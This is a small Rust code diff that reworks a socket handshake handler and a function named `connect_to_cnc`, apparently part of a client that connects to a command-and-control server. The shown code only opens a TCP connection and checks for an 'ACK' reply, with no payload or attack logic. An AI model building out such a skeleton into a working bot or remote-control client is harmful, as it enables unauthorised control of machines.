@@ -37,12 +37,16 @@ impl SocketStream {
         }
     }
 
-    pub async fn handle_msg(&self, msg: Vec<u8>) {
+    pub async fn handle_msg(&mut self, msg: Vec<u8>) {
+        let msg = String::from_utf8(msg).unwrap();
+
         match &self.state { 
             SocketState::Handshake(handshake_state) => {
                 match handshake_state {
-                    ServerHello => {
-
+                    HandshakeState::ServerHello => {
+                        if msg == "ACK" {
+                            println!("Finished handshake successfully!");
+                        }                
                     },
                 }
             },
@@ -51,9 +55,8 @@ impl SocketStream {
     }
 }
 pub async fn connect_to_cnc(ip: &str, port: u16) -> Result<TcpStream, Box<dyn std::error::Error>> {
-    let mut stream = TcpStream::connect(&format!("{}:{}", ip, port)).await?;
+    let stream = TcpStream::connect(&format!("{}:{}", ip, port)).await?;
 
-    stream.write_all(b"test").await?;
     Ok(stream)
 }
 
